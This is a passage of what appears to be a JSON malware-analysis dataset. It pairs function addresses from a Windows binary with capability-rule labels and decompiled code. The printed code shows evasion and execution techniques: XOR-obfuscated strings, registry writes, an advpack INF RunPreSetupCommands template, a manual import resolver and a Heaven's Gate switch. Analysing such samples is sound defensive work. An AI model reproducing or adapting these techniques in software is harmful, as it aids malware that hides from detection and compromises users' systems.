        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e684(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41cda4 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "0040fe80": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040fe80(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.0040fed5(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 185
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    // [00] -r-x section size 61440 named .text\n    uVar11 = 0;\n    piVar5 = fcn.0040a626();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 821
    },
    "0040110c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040110c(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    int16_t *var_ach;\n    int16_t *var_a8h;\n    int32_t var_a4h;\n    ushort var_a0h;\n    uint var_9eh;\n    uint var_99h;\n    uint var_95h;\n    uint var_91h;\n    uint var_8dh;\n    ushort var_89h;\n    uchar var_87h;\n    uint var_86h;\n    uint var_81h;\n    uint var_7dh;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    int32_t var_41h;\n    int32_t var_3ch;\n    int16_t *var_38h;\n    uint var_34h;\n    int32_t hKey;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_b4h = 1;\n    var_2ch = 0x4c2b5307;\n    var_28h = 0x53224f10;\n    var_24h = 0x4f1a4c3b;\n    var_20h = 0x4c075337;\n    var_1ch = 0x53304f18;\n    var_18h = 0x4f174c3a;\n    var_14h = 0x4c22532f;\n    var_10h._0_2_ = 0x4f76;\n    var_8h = 0x4c4e5343;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4f76);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    hKey = 6;\n    var_b0h = 0;\n    iVar9 = 0;\n    var_a8h = piVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar5 != 0x72d56d) {\n            *(iVar9 + piVar4) = *(&var_8h + iVar9 % hKey) ^ (iVar9 + piVar4)[&var_2ch - piVar4];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x1e);\n    var_a4h = 5;\n    var_9eh._0_1_ = 5;\n    var_a0h = 0x5802;\n    stack0xffffff5f = 0x25520b61;\n    var_99h = 0xc611d58;\n    var_95h = 0xf582352;\n    var_91h = 0x1c523161;\n    var_8dh = 0xe610358;\n    var_89h = 0x2352;\n    var_87h = 0x58;\n    stack0xffffff77 = 0x3e521e61;\n    var_81h = 0x19610c58;\n    var_7dh = 0x23580d52;\n    var_79h = 0x10522861;\n    var_75h = 0x31612158;\n    var_71h = 0x18581652;\n    var_6dh = 0x24520261;\n    var_69h = 0x3d611a58;\n    var_65h._0_2_ = 0x3e52;\n    var_65h._2_1_ = 0x58;\n    var_65h._3_1_ = 6;\n    var_61h = 0x32520461;\n    var_5dh = 0x31611358;\n    var_59h = 0xf580152;\n    var_55h = 0x35520361;\n    var_51h = 0x3610358;\n    var_4dh = 0x2d583652;\n    var_49h = 0x1e523d61;\n    var_45h = 0x6d611958;\n    var_41h._0_1_ = 0x52;\n    var_8h = 0x616a5851;\n    var_4h = CONCAT22(var_4h._2_2_, 0x526d);\n    var_86h._0_1_ = var_9eh;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_3ch = &var_a0h - iVar9;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar6 != 0xfbba26) {\n            *(iVar5 + iVar9) = *(&var_8h + iVar5 % hKey) ^ (iVar5 + iVar9)[&var_a0h - iVar9];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x60);\n    hKey = fcn.004038f7(0x20006);\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (hKey != 0) {\n        var_ch = 0x77235130;\n        var_8h = 0x4c3f7344;\n        var_4h = 0x51733103;\n        var_38h = 0x774c5173;\n        var_34h._0_1_ = 0x31;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = 0;\n        unique0x10000358 = &var_ch - iVar5;\n        var_3ch = iVar5;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n            if (iVar7 != 0x284a56) {\n                *(iVar6 + iVar5) = *(&var_38h + iVar6 % var_a4h) ^ (iVar6 + iVar5)[&var_ch - iVar5];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xc);\n        var_1ch = 0x6f2e4115;\n        var_18h = 0x4f294542;\n        var_14h = 0x4145365e;\n        var_8h = 0x6f4f4145;\n        var_4h = CONCAT31(var_4h._1_3_, 0x36);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = 0;\n        unique0x10000354 = &var_1ch - iVar5;\n        var_38h = iVar5;\n        do {\n            iVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar7 != 0x4e3a0a) {\n                *(iVar6 + iVar5) = *(&var_8h + iVar6 % var_a4h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xc);\n        var_20h = 0x51246f35;\n        var_1ch = 0x411b6627;\n        var_18h = 0x6f094438;\n        var_14h = 0x6675512f;\n        var_10h._0_2_ = 0x416f;\n        var_8h = 0x51416f66;\n        var_4h = CONCAT31(var_4h._1_3_, 0x44);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = 0;\n        unique0x10000350 = &var_20h - iVar5;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar7 != 0x6b2394) {\n                *(iVar6 + iVar5) = *(&var_8h + iVar6 % var_a4h) ^ (iVar6 + iVar5)[&var_20h - iVar5];\n            }\n            pcVar8 = _sym.imp.ADVAPI32.dll_RegSetValueExW;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_3ch, 0, 4, &var_b4h, 4);\n        iVar6 = var_38h;\n        piVar4 = var_ach;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_b0h);\n        (*pcVar8)(hKey, var_38h, 0, 1, var_ach, (piVar4 - (var_ach + 1) >> 1) * 2);\n        var_38h = var_a8h + 1;\n        piVar4 = var_a8h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_b0h);\n        (*pcVar8)(hKey, iVar5, 0, 1, var_a8h, (piVar4 - var_38h >> 1) * 2);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar8)(0, iVar6);\n        (*pcVar2)(uVar3);\n        uVar3 = (*pcVar8)(0, var_3ch);\n        (*pcVar2)(uVar3);\n    }\n    piVar4 = var_a8h;\n    uVar3 = (*pcVar8)(0, iVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar8)(0, piVar4);\n    (*pcVar2)(uVar3);\n    return 1;\n}\n",
        "token_count": 2703
    },
    "00401b0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401b0c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 117
    },
    "00401b2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401b2b(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00401b0c();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 356
    },
    "00401bb1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401bb1(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "00401c18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401c18(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0x80000000) {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    else {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 339
    },
    "00401c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401c80(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x41cdb4;\n    iVar4 = *(*(*0x41cdb4 + 0x3c) + 0x80 + *0x41cdb4);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x41cdb4;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.00401c18(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 424
    },
    "00403551": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00403551(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 267
    },
    "00404132": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00404132(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 108
    },
    "0040414c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040414c(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 130
    },
    "00404172": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00404172(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x4104fc;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x4104fc;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 418
    },
    "0040474a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040474a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 498
    },
    "0040485c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040485c(uint *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_38h;\n    uint var_34h;\n    int32_t hObject;\n    uint ARG_0;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *dwProcessId;\n    uint pSessionId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint dwBytes;\n    int32_t TokenHandle;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    dwProcessId = param_1;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x104;\n    var_10h = puVar3;\n    uVar2 = (*pcVar6)(8, 0x208);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_20h = 0x104;\n    var_1ch = 0;\n    dwBytes = 0;\n    pSessionId = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (TokenHandle == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &dwBytes);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*pcVar6)(8, dwBytes);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*pcVar1)(TokenHandle, 1, dwProcessId, dwBytes, &dwBytes);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_34h);\n                                if (iVar5 != 0) {\n                                    var_64h = 0x4c1f746b;\n                                    var_60h = 0x5a27380a;\n                                    var_28h = 5;\n                                    var_5ch._0_1_ = 5;\n                                    stack0xffffffa1 = 0x14747759;\n                                    var_57h = 0x2838634c;\n                                    var_53h = 0x1d59105a;\n                                    var_4fh._0_2_ = 0x2974;\n                                    var_4fh._2_1_ = 0x4c;\n                                    var_4bh = 0x3f5a5138;\n                                    var_47h = 0x7f746459;\n                                    var_43h = 0x74383d4c;\n                                    var_3fh._0_1_ = 0x5a;\n                                    stack0xffffffc0 = 0x4c5a7438;\n                                    var_38h._0_1_ = 0x59;\n                                    var_4fh._3_1_ = var_5ch;\n                                    uVar2 = (*pcVar6)(8, 0x4d);\n                                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar8 = 0;\n                                    do {\n                                        iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n                                        if (iVar4 != 0x69e14e) {\n                                            *(iVar8 + iVar5) =\n                                                 *(&var_3fh + iVar8 % var_28h + 3) ^ (iVar8 + iVar5)[&var_64h - iVar5];\n                                        }\n                                        iVar8 = iVar8 + 1;\n                                    } while (iVar8 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar5, var_ch, var_10h, pSessionId);\n                                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                            }\n                            uVar2 = (*pcVar6)(0, dwProcessId);\n                            (*pcVar7)(uVar2);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar3 = var_10h;\n        }\n        uVar2 = (*pcVar6)(0, var_ch);\n        (*pcVar7)(uVar2);\n        uVar2 = (*pcVar6)(0, puVar3);\n        (*pcVar7)(uVar2);\n        uVar2 = 